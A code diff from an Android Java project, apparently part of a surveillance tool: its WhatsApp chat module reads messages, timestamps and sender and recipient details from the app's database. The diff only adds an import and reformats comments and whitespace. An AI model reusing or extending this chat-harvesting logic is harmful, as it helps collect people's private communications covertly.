@@ -30,6 +30,7 @@ import com.android.networking.db.RecordVisitor;
 import com.android.networking.evidence.Markup;
 import com.android.networking.file.Path;
 import com.android.networking.listener.ListenerProcess;
+import com.android.networking.manager.ManagerModule;
 import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
@@ -409,9 +410,9 @@ public class ChatWhatsapp extends SubModuleChat {
 			int index = cursor.getInt(0); // f_4
 			String message = cursor.getString(2); // f_7
 			Long timestamp = cursor.getLong(3); // f_b
-			
+
 			boolean incoming = cursor.getInt(4) != 1; // f_c
-			
+
 			String remote = clean(cursor.getString(5));
 
 			if (Cfg.DEBUG) {
@@ -428,21 +429,22 @@ public class ChatWhatsapp extends SubModuleChat {
 			}
 
 			if (Cfg.DEBUG) {
-				//Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(message.getBytes()));
+				// Check.log(TAG + " (fetchMessages): " +
+				// StringUtils.byteArrayToHexString(message.getBytes()));
 			}
 
 			String from = incoming ? peer : myPhoneNumber;
 			String to = incoming ? myPhoneNumber : peer;
 
-			//if (groups.isGroup(peer)) {
-			//	to = groups.getGroupTo(from, peer);
-			//}
-			
+			// if (groups.isGroup(peer)) {
+			// to = groups.getGroupTo(from, peer);
+			// }
+
 			if (groups.isGroup(peer)) {
 				if (incoming) {
 					from = remote;
 				} else {
-					//to = groups.getGroupTo(from, peer);
+					// to = groups.getGroupTo(from, peer);
 				}
 				to = groups.getGroupTo(from, peer);
 			}
